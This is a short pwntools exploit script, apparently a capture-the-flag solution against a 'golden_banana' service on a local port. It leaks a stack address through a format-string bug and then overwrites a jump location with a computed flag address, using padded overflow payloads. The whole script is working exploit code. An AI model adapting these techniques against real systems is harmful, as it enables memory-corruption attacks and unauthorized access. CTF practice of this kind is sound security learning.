#!/usr/bin/env python3
from pwn import *
import os
import time

# p = process('../golden_banana')
p = remote('0.0.0.0', 31337)

# context.terminal = ('tmux', 'splitw', '-h')
# gdb.attach(p, gdbscript='b *main+165\nc\n')
# time.sleep(1)

print(p.recv().decode())
p.sendline(b'1')
print(p.recv().decode())

# Exploit ez format string vuln
payload = b'2\x00'.ljust(6184, b'A')  # move back
payload += b'%7$p###'
p.sendline(payload)

print(p.recv().decode())
p.sendline(b'1')

leak = p.recvuntil(b'###')[:-3]
print(f'{leak=}')
leak = leak.split(b'0x', maxsplit=1)[1]
stack_addr = int(leak, 16)
print(f'{hex(stack_addr)=}')
flag_location = stack_addr + 72240
print(f'{hex(flag_location)=}')

print(p.recv().decode())

# Overwrite the location to jump to for choice 1 to be the flag address
location_offset = 8232
payload = b'1 '.ljust(8232, b'A')
payload += p64(flag_location)
p.sendline(payload)

p.interactive()

